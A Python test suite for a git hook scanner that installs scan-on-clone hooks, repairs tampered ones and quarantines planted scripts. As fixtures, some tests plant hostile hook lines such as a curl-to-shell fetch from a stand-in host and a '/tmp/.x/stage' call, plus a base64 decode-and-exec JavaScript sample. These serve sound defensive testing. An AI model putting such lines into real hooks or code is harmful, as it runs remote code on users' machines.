#!/usr/bin/env python3
"""`saw hook` — scan-on-clone (#1195). Install/uninstall/status against an ISOLATED git global
config + XDG dirs, and the hook body's scope decisions, SHA cache, kill-switch, and — the
load-bearing one — that it scans with the OPERATOR's policy and NEVER a cloned repo's own config.
Everything is offline (a local git repo stands in for a clone)."""
from __future__ import annotations

import contextlib
import io
import json
import os
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

from stayawake.bots.security import hook

_INFECTED = "node_modules\ntemp_auto_push.bat\nbranch_structure.json\n"   # confirmed worm markers


def _run(repo, *args):
    subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True)


def _repo(files: dict[str, str]) -> Path:
    d = Path(tempfile.mkdtemp(prefix="hook-"))
    _run(d, "init", "-q")
    for cmd in (["config", "user.email", "t@t"], ["config", "user.name", "t"],
                ["config", "commit.gpgsign", "false"]):
        _run(d, *cmd)
    for rel, content in files.items():
        p = d / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    _run(d, "add", "-A")
    _run(d, "commit", "-qm", "init")
    return d


class _Isolated(unittest.TestCase):
    """Give each test its own HOME / XDG dirs and git global config so nothing touches the machine."""

    def setUp(self):
        self.home = Path(tempfile.mkdtemp(prefix="hook-home-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.home, ignore_errors=True))
        self.env = mock.patch.dict(os.environ, {
            "HOME": str(self.home),
            "XDG_CONFIG_HOME": str(self.home / ".config"),
            "XDG_CACHE_HOME": str(self.home / ".cache"),
            "XDG_STATE_HOME": str(self.home / ".local" / "state"),
            "GIT_CONFIG_GLOBAL": str(self.home / "gitconfig"),   # isolate `git config --global`
        })
        self.env.start()
        self.addCleanup(self.env.stop)
        os.environ.pop("SAW_HOOK_DISABLED", None)

    def _in_repo(self, repo: Path):
        cwd = os.getcwd()
        os.chdir(repo)
        self.addCleanup(lambda: os.chdir(cwd))


class TestInstallUninstall(_Isolated):
    def _global_template(self):
        return hook.gitutil.stdout(None, ["config", "--global", "--get", "init.templateDir"]).strip()

    def test_install_sets_templatedir_and_writes_executable_hooks(self):
        self.assertEqual(hook.install(), 0)
        self.assertEqual(self._global_template(), str(hook.template_dir()))
        for name in ("post-checkout", "post-merge"):
            f = hook._hooks_dir() / name
            self.assertTrue(f.exists() and os.access(f, os.X_OK), name)
            self.assertIn(hook._MARKER, f.read_text())

    def test_no_stream_turns_install_progress_off(self):
        with mock.patch.object(hook, "busy") as spinning, \
             mock.patch.object(hook, "settle_hooks",
                               return_value=hook.Settling(problem="stopped", code=2)):
            spinning.return_value.__enter__ = mock.Mock()
            spinning.return_value.__exit__ = mock.Mock(return_value=False)
            hook.install(no_stream=True)
        self.assertTrue(spinning.call_args.kwargs.get("no_stream"))

    def test_status_reflects_install(self):
        hook.install()
        # status just prints + returns 0; assert it detects our hooks as installed.
        self.assertTrue([e for e in hook._HOOKS if hook._is_ours(hook._hooks_dir() / e)])
        self.assertEqual(hook.status(), 0)

    def test_uninstall_unsets_and_removes(self):
        hook.install()
        self.assertEqual(hook.uninstall(), 0)
        self.assertEqual(self._global_template(), "")
        self.assertFalse((hook._hooks_dir() / "post-checkout").exists())

    def test_reinstall_is_idempotent(self):
        hook.install()
        self.assertEqual(hook.install(), 0)                       # no HookError, no duplicate
        self.assertEqual(self._global_template(), str(hook.template_dir()))

    def test_missing_config_is_rejected(self):
        self.assertEqual(hook.install(config_path="/no/such/config.yml"), 2)

    def test_install_warns_on_conflicting_global_hookspath(self):
        # A global core.hooksPath makes git ignore .git/hooks — our template hooks would silently
        # never run. Install must WARN, not report a false success.
        hook.gitutil.run_ok(None, ["config", "--global", "core.hooksPath", str(self.home / "hp")])
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            self.assertEqual(hook.install(), 0)
        self.assertIn("core.hooksPath", buf.getvalue())
        self.assertIn("WON'T run", buf.getvalue())


class TestNeverClobber(_Isolated):
    def test_existing_templatedir_foreign_hook_is_preserved_and_chained(self):
        # The operator already runs their OWN template dir with a post-checkout — we must coexist.
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        foreign = user_tpl / "hooks" / "post-checkout"
        foreign.write_text("#!/bin/sh\necho theirs\n")
        os.chmod(foreign, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)])

        self.assertEqual(hook.install(), 0)
        # Their hook is preserved as .local and OUR hook chains to it (never clobbered).
        preserved = user_tpl / "hooks" / "post-checkout.local"
        self.assertTrue(preserved.exists())
        self.assertIn("echo theirs", preserved.read_text())
        ours = (user_tpl / "hooks" / "post-checkout").read_text()
        self.assertIn(hook._MARKER, ours)
        self.assertIn("post-checkout.local", ours)
        # We did NOT hijack their templateDir setting.
        self.assertEqual(
            hook.gitutil.stdout(None, ["config", "--global", "--get", "init.templateDir"]).strip(),
            str(user_tpl))

    def test_uninstall_restores_the_foreign_hook(self):
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        foreign = user_tpl / "hooks" / "post-checkout"
        foreign.write_text("#!/bin/sh\necho theirs\n")
        os.chmod(foreign, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)])
        hook.install()
        hook.uninstall()
        restored = user_tpl / "hooks" / "post-checkout"
        self.assertTrue(restored.exists())
        self.assertIn("echo theirs", restored.read_text())
        self.assertNotIn(hook._MARKER, restored.read_text())


class TestRunEventScope(_Isolated):
    def test_clone_full_scan_flags_infected(self):
        repo = _repo({".gitignore": _INFECTED})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, head, "1"]), 1)

    def test_clone_clean_returns_zero(self):
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, head, "1"]), 0)

    def test_branch_switch_diff_scans_newly_materialised_code(self):
        # Switching to a branch that carries a worm materialises never-scanned code → it MUST be
        # caught (the old "skip every branch switch" behaviour was an evasion gap).
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        old = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        _run(repo, "checkout", "-qb", "evil")
        (repo / ".gitignore").write_text(_INFECTED)
        _run(repo, "add", "-A")
        _run(repo, "commit", "-qm", "evil")
        new = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        self.assertEqual(hook.run_event("post-checkout", [old, new, "1"]), 1)

    def test_branch_switch_with_no_changes_is_skipped(self):
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        with mock.patch.object(hook, "scan_target") as m:
            self.assertEqual(hook.run_event("post-checkout", [head, head, "1"]), 0)
            m.assert_not_called()                        # nothing changed head..head → no scan

    def test_scan_timeout_reports_unverified_not_clean(self):
        # A giant clone must never hang git: the scan runs under a budget; on timeout the hook says
        # UNVERIFIED (exit 2), never "clean".
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        with mock.patch.object(hook, "_operator_scan", side_effect=lambda *a, **k: time.sleep(3)), \
             mock.patch.dict(os.environ, {"SAW_HOOK_TIMEOUT": "0.2"}):
            self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, head, "1"]), 2)

    def test_file_checkout_is_skipped(self):
        repo = _repo({".gitignore": _INFECTED})
        self._in_repo(repo)
        with mock.patch.object(hook, "scan_target") as m:
            self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, "x", "0"]), 0)
            m.assert_not_called()

    def test_pull_diff_scans_only_changed_files(self):
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        first = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        (repo / ".gitignore").write_text(_INFECTED)
        _run(repo, "add", "-A")
        _run(repo, "commit", "-qm", "pulled")
        _run(repo, "update-ref", "ORIG_HEAD", first)             # simulate what a pull sets
        captured = {}
        real = hook.scan_target

        def spy(target, *a, **k):
            captured["files"] = list(target.iter_files())
            return real(target, *a, **k)

        with mock.patch.object(hook, "scan_target", side_effect=spy):
            rc = hook.run_event("post-merge", ["0"])
        self.assertEqual(rc, 1)                                  # the pulled worm is caught
        self.assertEqual(captured["files"], [".gitignore"])      # ONLY the changed file was scanned

    def test_post_rewrite_diff_scans_rebased_code(self):
        # `git pull --rebase` (and rebase) fire post-rewrite; ORIG_HEAD..HEAD is the replayed code.
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        first = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        (repo / ".gitignore").write_text(_INFECTED)
        _run(repo, "add", "-A")
        _run(repo, "commit", "-qm", "rebased-in worm")
        _run(repo, "update-ref", "ORIG_HEAD", first)     # what a rebase/pull --rebase sets
        self.assertEqual(hook.run_event("post-rewrite", ["rebase"]), 1)

    def test_post_rewrite_without_orig_head_is_skipped(self):
        repo = _repo({".gitignore": _INFECTED})          # fresh repo → no ORIG_HEAD
        self._in_repo(repo)
        with mock.patch.object(hook, "scan_target") as m:
            self.assertEqual(hook.run_event("post-rewrite", ["amend"]), 0)
            m.assert_not_called()

    def test_infected_warning_is_branded_and_actionable(self):
        repo = _repo({".gitignore": _INFECTED})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            rc = hook.run_event("post-checkout", [hook._NULL_REV, head, "1"])
        out = buf.getvalue()
        self.assertEqual(rc, 1)
        self.assertIn("StayAwakeBot", out)                   # correct product branding…
        self.assertNotIn("stayawake:", out)                  # …not the old lowercase prefix
        # spells out what to AVOID, not just "before running it"
        self.assertIn("npm install", out)
        self.assertIn("editor", out)
        # the remediation commands are present (rendered distinctly via LINK)
        self.assertIn("saw scan ", out)
        self.assertIn("saw fix ", out)

    def test_suspicious_warning_spells_out_what_to_avoid(self):
        # a base64 decode→exec repo is heuristic/suspicious, not confirmed-infected
        repo = _repo({"index.js": "const r = require('child_process').execSync("
                                  "Buffer.from('ZWNobyBoaQ==','base64').toString());\n"})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            rc = hook.run_event("post-checkout", [hook._NULL_REV, head, "1"])
        out = buf.getvalue()
        self.assertEqual(rc, 0)                              # suspicious does not fail
        self.assertIn("StayAwakeBot", out)
        self.assertIn("npm install", out)                    # avoid-list, not just "before running it"
        self.assertIn("saw scan ", out)

    def test_no_stream_turns_the_spinner_off(self):
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        scanned = mock.Mock(error=None, infected=False, suspicious=False)
        with mock.patch.object(hook, "stream_enabled", return_value=False) as enabled, \
             mock.patch.object(hook, "_scan_within_budget", return_value=scanned):
            hook.run_event("post-checkout", [hook._NULL_REV, head, "1"], no_stream=True)
        self.assertTrue(enabled.call_args.kwargs.get("force_off"))

    def test_kill_switch_skips_everything(self):
        repo = _repo({".gitignore": _INFECTED})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        with mock.patch.dict(os.environ, {"SAW_HOOK_DISABLED": "1"}), \
             mock.patch.object(hook, "scan_target") as m:
            self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, head, "1"]), 0)
            m.assert_not_called()

    def test_sha_cache_skips_second_full_scan(self):
        repo = _repo({"app.js": "export const x = 1;\n"})
        self._in_repo(repo)
        head = hook.gitutil.stdout(repo, ["rev-parse", "HEAD"]).strip()
        self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, head, "1"]), 0)
        with mock.patch.object(hook, "scan_target") as m:       # same tree → cache hit, no rescan
            self.assertEqual(hook.run_event("post-checkout", [hook._NULL_REV, head, "1"]), 0)
            m.assert_not_called()

    def test_a_template_dir_spelled_with_a_tilde_is_written_where_git_reads_it(self):
        subprocess.run(["git", "config", "--global", "init.templateDir", "~/.git-template"], check=True)
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(hook.install(), 0)
        self.assertTrue((self.home / ".git-template" / "hooks" / "post-checkout").is_file())
        self.assertFalse((Path.cwd() / "~").exists())

    def test_the_cache_forgets_a_repository_that_is_gone(self):
        repo = _repo({"app.js": "export const x = 1;\n"})
        gone = self.home / "gone"
        hook._cache_path().parent.mkdir(parents=True, exist_ok=True)
        hook._cache_path().write_text(json.dumps({str(gone): "0ld", os.path.realpath(repo): "stale"}))
        hook._remember(repo, "fresh")
        self.assertEqual(hook._load_cache(), {os.path.realpath(repo): "fresh"})


def _quarantined(home: Path) -> list[Path]:
    root = home / ".local" / "state" / "saw" / "quarantine" / "hooks"
    return sorted(root.iterdir()) if root.is_dir() else []


class TestSawsDirectoryIsSawsAlone(_Isolated):
    def _managed(self) -> Path:
        return self.home / ".config" / "saw" / "git-template" / "hooks"

    def _quiet(self, fn, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = fn(*args)
        return code, out.getvalue()

    def test_a_stranger_in_saws_directory_is_moved_aside_never_chained(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        planted = managed / "post-checkout"
        planted.write_text("#!/bin/sh\ncurl -s http://127.0.0.1:9/p | sh\n")
        os.chmod(planted, 0o755)
        (managed / "post-merge.local").write_text("#!/bin/sh\n/tmp/.x/stage\n")
        (managed / "notes.txt").write_text("hello\n")
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertFalse((managed / "post-checkout.local").exists())
        self.assertFalse((managed / "post-merge.local").exists())
        self.assertFalse((managed / "notes.txt").exists())
        self.assertEqual(sorted(p.name for p in managed.iterdir()), sorted(hook._HOOKS))
        for event in hook._HOOKS:
            self.assertEqual(hook.hookscript.verdict(managed / event), hook.hookscript.PRISTINE)
        kept = _quarantined(self.home)
        self.assertEqual(len(kept), 3, kept)
        by_name = {f.name.split("-", 1)[1]: f for f in kept}
        self.assertIn("curl -s http://127.0.0.1:9/p | sh", (by_name["post-checkout"] / "kept" / "post-checkout").read_text())
        record = json.loads((by_name["post-checkout"] / "origin.json").read_text())
        self.assertEqual(record["path"], str(planted))
        self.assertTrue(record["sha256"].startswith(hook.hookscript.digest_file(by_name["post-checkout"] / "kept" / "post-checkout")[:64]))
        self.assertIn("quarantined", text)
        self.assertIn(str(planted), text)

    def test_an_altered_saw_hook_is_repaired_and_its_content_kept(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        managed = self._managed()
        altered = (managed / "post-merge").read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n")
        (managed / "post-merge").write_text(altered)
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertEqual(hook.hookscript.verdict(managed / "post-merge"), hook.hookscript.PRISTINE)
        (kept,) = _quarantined(self.home)
        self.assertEqual((kept / "kept" / "post-merge").read_text(), altered)
        self.assertIn("repaired", text)

    def test_the_operators_own_template_directory_keeps_their_hook_but_not_an_altered_one_of_saws(self):
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        theirs = user_tpl / "hooks" / "post-checkout"
        theirs.write_text("#!/bin/sh\necho theirs\n")
        os.chmod(theirs, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(user_tpl)])
        self.assertEqual(self._quiet(hook.install)[0], 0)
        self.assertIn("echo theirs", (user_tpl / "hooks" / "post-checkout.local").read_text())
        self.assertEqual(_quarantined(self.home), [])
        ours = user_tpl / "hooks" / "post-merge"
        ours.write_text(ours.read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n"))
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertEqual(hook.hookscript.verdict(ours), hook.hookscript.PRISTINE)
        self.assertEqual(len(_quarantined(self.home)), 1)
        self.assertIn("echo theirs", (user_tpl / "hooks" / "post-checkout.local").read_text())

    def test_pointing_the_hooks_path_at_saws_directory_does_not_make_a_stranger_there_yours(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        planted = managed / "post-checkout.local"
        planted.write_text("#!/bin/sh\n/tmp/.x/stage\n")
        os.chmod(planted, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "core.hooksPath", str(managed)])
        self.assertEqual(self._quiet(hook.install)[0], 0)
        self.assertFalse(planted.exists())
        self.assertEqual(len(_quarantined(self.home)), 1)
        self.assertEqual(hook.hookscript.altered_hooks(), [])
        planted.write_text("#!/bin/sh\n/tmp/.x/stage\n")
        self.assertEqual(hook.hookscript.altered_hooks(), [planted])
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertFalse(planted.exists())

    def test_a_hook_that_cannot_be_read_back_as_written_is_not_counted(self):
        real_replace = os.replace

        def tampered(src, dst):
            real_replace(src, dst)
            with open(dst, "ab") as fh:
                fh.write(b"#\n")

        with mock.patch("os.replace", side_effect=tampered):
            code, text = self._quiet(hook.install)
        self.assertEqual(code, 3, text)
        self.assertIn("could not verify", text)
        self.assertIn("NOT fully installed", text)
        self.assertEqual(hook.hookscript.installed(), (hook._saw_executable(), None))

    def test_uninstall_moves_aside_what_is_not_saws_in_saws_directory(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        managed = self._managed()
        (managed / "post-checkout.local").write_text("#!/bin/sh\n/tmp/.x/stage\n")
        altered = managed / "post-merge"
        altered.write_text(altered.read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n"))
        code, text = self._quiet(hook.uninstall)
        self.assertEqual(code, 0, text)
        self.assertEqual(list(managed.iterdir()), [])
        kept = _quarantined(self.home)
        self.assertEqual(sorted(Path(json.loads((f / "origin.json").read_text())["path"]).name for f in kept),
                         ["post-checkout.local", "post-merge"])
        self.assertIn("quarantined", text)

    def test_a_link_in_saws_directory_is_moved_aside_even_when_it_points_at_a_hook_saw_installs(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        elsewhere = self.home / "elsewhere"
        elsewhere.write_text(hook.hookscript.render("post-checkout", hook._saw_executable(), None))
        os.chmod(elsewhere, 0o755)
        os.symlink(elsewhere, managed / "post-checkout")
        self.assertEqual(hook.hookscript.verdict(managed / "post-checkout"), hook.hookscript.FOREIGN)
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertFalse((managed / "post-checkout").is_symlink())
        self.assertEqual(hook.hookscript.verdict(managed / "post-checkout"), hook.hookscript.PRISTINE)
        (kept,) = _quarantined(self.home)
        self.assertTrue((kept / "kept" / "post-checkout").is_symlink())
        self.assertTrue(elsewhere.exists())

    def test_nothing_is_ever_written_through_a_link(self):
        hooks = self.home / "hooks"
        hooks.mkdir()
        elsewhere = self.home / "elsewhere"
        elsewhere.write_text("keep\n")
        os.symlink(elsewhere, hooks / "post-merge")
        self.assertFalse(hook._write_verified(hooks / "post-merge", "new\n", hooks))
        self.assertEqual(elsewhere.read_text(), "keep\n")

    def test_status_says_when_something_is_not_what_saw_installed(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        self.assertNotIn("saw hook repair", self._quiet(hook.status)[1])
        (self._managed() / "post-checkout").write_text("#!/bin/sh\n/tmp/.x/stage\n")
        self.assertIn("saw hook repair", self._quiet(hook.status)[1])
        self.assertEqual(self._quiet(hook.repair)[0], 0)
        self.assertNotIn("saw hook repair", self._quiet(hook.status)[1])
        (self._managed() / "post-merge").write_text(hook.hookscript.render("post-merge", str(self.home / "other" / "saw"), None))
        self.assertEqual(hook.hookscript.altered_hooks(), [self._managed() / "post-merge"])
        self.assertIn("saw hook repair", self._quiet(hook.status)[1])


class TestRepair(_Isolated):
    def _quiet(self, fn, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = fn(*args)
        return code, out.getvalue()

    def _seeded(self, name: str) -> Path:
        repo = _repo({f"{name}.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(repo, ignore_errors=True))
        cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True, exist_ok=True)
        known = json.loads(cache.read_text()) if cache.exists() else {}
        known[str(repo)] = "abc"
        cache.write_text(json.dumps(known))
        return repo

    def test_nothing_seeded_means_nothing_to_repair(self):
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0)
        self.assertIn("nothing to repair", text)
        self.assertEqual(_quarantined(self.home), [])

    def test_repair_puts_back_the_hooks_in_every_seeded_repository_and_leaves_their_own(self):
        cfg = self.home / "security.yml"
        cfg.write_text("allowlist: []\n")
        self.assertEqual(self._quiet(hook.install, str(cfg))[0], 0)
        repo = self._seeded("a")
        hooks = repo / ".git" / "hooks"
        for event in ("post-checkout", "post-merge"):
            (hooks / event).write_text(hook.hookscript.render(event, "/usr/local/bin/saw", str(cfg)))
            os.chmod(hooks / event, 0o755)
        altered = hooks / "post-checkout"
        altered.write_text(altered.read_text().replace("exit 0\n", "/tmp/.x/stage\nexit 0\n"))
        theirs = hooks / "post-rewrite"
        theirs.write_text("#!/bin/sh\nnpx lint-staged\n")
        os.chmod(theirs, 0o755)
        chained = hooks / "post-merge.local"
        chained.write_text("#!/bin/sh\necho after\n")
        os.chmod(chained, 0o755)
        managed = self.home / ".config" / "saw" / "git-template" / "hooks"
        (managed / "post-rewrite").write_text("#!/bin/sh\ncurl -s http://127.0.0.1:9/p | sh\n")

        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual(hook.hookscript.verdict(altered), hook.hookscript.PRISTINE)
        self.assertIn(f"--config {cfg}", altered.read_text())
        self.assertEqual(theirs.read_text(), "#!/bin/sh\nnpx lint-staged\n")
        self.assertEqual(chained.read_text(), "#!/bin/sh\necho after\n")
        self.assertEqual(hook.hookscript.verdict(managed / "post-rewrite", (hook._saw_executable(), str(cfg))),
                         hook.hookscript.PRISTINE)
        self.assertEqual(len(_quarantined(self.home)), 3)
        self.assertIn(f"repaired: {altered}", text)
        self.assertIn(f"updated: {hooks / 'post-merge'}", text)
        self.assertIn(hook._saw_executable(), (hooks / "post-merge").read_text())
        self.assertIn(f"left: {theirs}", text)
        self.assertIn(f"chained: {chained}", text)
        self.assertIn(f"quarantined: {managed / 'post-rewrite'}", text)

        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual(len(_quarantined(self.home)), 3)
        self.assertNotIn("repaired:", text)
        self.assertNotIn("quarantined:", text)
        self.assertNotIn("updated:", text)

    def test_a_repository_git_cannot_answer_for_withholds_the_all_clear(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        repo = self._seeded("b")
        gitdir = self.home / "gitdir"
        gitdir.mkdir()
        __import__("shutil").rmtree(repo / ".git")
        (repo / ".git").write_text(f"gitdir: {gitdir}\n")
        os.chmod(gitdir, 0)
        self.addCleanup(os.chmod, gitdir, 0o700)
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 3, text)
        self.assertIn(f"could not read: {repo}", text)

    def test_a_shared_hooks_directory_is_settled_once(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        managed = self.home / ".config" / "saw" / "git-template" / "hooks"
        repo = self._seeded("c")
        _run(repo, "config", "core.hooksPath", str(managed))
        (managed / "post-merge").write_text("#!/bin/sh\n/tmp/.x/stage\n")
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual(text.count("quarantined:"), 1)
        self.assertEqual(len(_quarantined(self.home)), 1)
        self.assertEqual(text.count(str(managed / "post-checkout")), 1, text)


class TestRepairLeavesWhatIsNotSaws(_Isolated):
    def _quiet(self, fn, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = fn(*args)
        return code, out.getvalue()

    def test_repair_does_not_install_into_a_template_directory_saw_never_installed_into(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        theirs_tpl = self.home / "dotfiles-git-template"
        (theirs_tpl / "hooks").mkdir(parents=True)
        theirs = theirs_tpl / "hooks" / "post-checkout"
        theirs.write_text("#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\n")
        os.chmod(theirs, 0o755)
        hook.gitutil.run_ok(None, ["config", "--global", "init.templateDir", str(theirs_tpl)])
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual(theirs.read_text(), "#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\n")
        self.assertEqual(sorted(p.name for p in (theirs_tpl / "hooks").iterdir()), ["post-checkout"])
        self.assertNotIn(str(theirs_tpl), text)
        marked = theirs_tpl / "hooks" / "post-merge"
        marked.write_text(hook.hookscript.render("post-merge", str(self.home / "evil" / "saw"), None))
        os.chmod(marked, 0o755)
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertIn(f"updated: {marked}", text)
        self.assertEqual(hook.hookscript.verdict(marked, hook.hookscript.installed()), hook.hookscript.PRISTINE)
        self.assertEqual(sorted(p.name for p in (theirs_tpl / "hooks").iterdir()), ["post-checkout", "post-merge"])
        self.assertEqual(theirs.read_text(), "#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\n")

    def test_a_directory_that_is_no_longer_a_repository_runs_no_hooks_and_is_not_unreadable(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        gone = self.home / "src" / "old"
        gone.mkdir(parents=True)
        (gone / "README").write_text("tarball\n")
        cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True, exist_ok=True)
        cache.write_text(json.dumps({str(gone): "abc"}))
        self.assertEqual(hook.hookscript.seeded_repositories(), [])
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertNotIn("could not read", text)

    def test_a_hook_git_cannot_run_is_put_back(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        managed = self.home / ".config" / "saw" / "git-template" / "hooks"
        crlf = managed / "post-checkout"
        crlf.write_bytes(crlf.read_bytes().replace(b"\n", b"\r\n"))
        self.assertEqual(hook.hookscript.verdict(crlf), hook.hookscript.ALTERED)
        os.chmod(managed / "post-merge", 0o644)
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertNotIn(b"\r", crlf.read_bytes())
        self.assertTrue(os.access(managed / "post-merge", os.X_OK))
        self.assertIn(f"repaired: {crlf}", text)
        self.assertIn(f"updated: {managed / 'post-merge'}", text)

    def test_a_path_is_printed_as_one_plain_line(self):
        managed = self.home / ".config" / "saw" / "git-template" / "hooks"
        managed.mkdir(parents=True)
        forged = managed / "x\n  in place: forged\x1b[32m"
        forged.write_text("payload\n")
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertNotIn("\n  in place: forged", text)
        self.assertNotIn("\x1b", text)
        self.assertNotIn("payload", text)
        (kept,) = _quarantined(self.home)
        self.assertNotIn("\n", kept.name)
        self.assertNotIn("\x1b", kept.name)
        self.assertEqual(json.loads((kept / "origin.json").read_text())["path"], str(forged))

    def test_a_hooks_path_that_is_saws_own_directory_is_not_a_bypass(self):
        managed = self.home / ".config" / "saw" / "git-template" / "hooks"
        hook.gitutil.run_ok(None, ["config", "--global", "core.hooksPath", str(managed)])
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertNotIn("WON'T run", text)
        self.assertNotIn("WON'T run", self._quiet(hook.status)[1])

    def test_a_hooks_directory_two_seeded_repositories_share_is_settled_once(self):
        self.assertEqual(self._quiet(hook.install)[0], 0)
        main = _repo({"a.txt": "x\n"})
        self.addCleanup(lambda: __import__("shutil").rmtree(main, ignore_errors=True))
        linked = self.home / "proj-feature"
        _run(main, "worktree", "add", "-q", str(linked), "-b", "feature")
        for event in hook._HOOKS:
            (main / ".git" / "hooks" / event).write_text(hook.hookscript.render(event, hook._saw_executable(), None))
            os.chmod(main / ".git" / "hooks" / event, 0o755)
        cache = self.home / ".cache" / "saw" / "hook-scan-cache.json"
        cache.parent.mkdir(parents=True, exist_ok=True)
        cache.write_text(json.dumps({str(main): "abc", str(linked): "abc"}))
        code, text = self._quiet(hook.repair)
        self.assertEqual(code, 0, text)
        self.assertEqual(text.count("post-checkout"), 2, text)
        self.assertNotIn("moved-aside", text)


class TestNothingIsWrittenWhereItShouldNotBe(_Isolated):
    def _quiet(self, fn, *args):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = fn(*args)
        return code, out.getvalue()

    def _managed(self) -> Path:
        return self.home / ".config" / "saw" / "git-template" / "hooks"

    def test_a_planted_staging_file_cannot_redirect_a_write(self):
        managed = self._managed()
        managed.mkdir(parents=True)
        victim = self.home / "notes.txt"
        victim.write_text("precious\n")
        os.chmod(victim, 0o600)
        os.symlink(victim, managed / "post-checkout.saw-tmp")
        os.symlink(victim, managed / ".saw-planted")
        code, text = self._quiet(hook.install)
        self.assertEqual(code, 0, text)
        self.assertEqual(victim.read_text(), "precious\n")
        self.assertEqual(oct(victim.stat().st_mode & 0o777), oct(0o600))
        for event in hook._HOOKS:
            self.assertFalse((managed / event).is_symlink())
        self.assertEqual(sorted(p.name for p in managed.iterdir()), sorted(hook._HOOKS))
        self.assertEqual(len(_quarantined(self.home)), 2)
        user_tpl = self.home / "my-template"
        (user_tpl / "hooks").mkdir(parents=True)
        os.symlink(victim, user_tpl / "hooks" / "post-merge.saw-tmp")
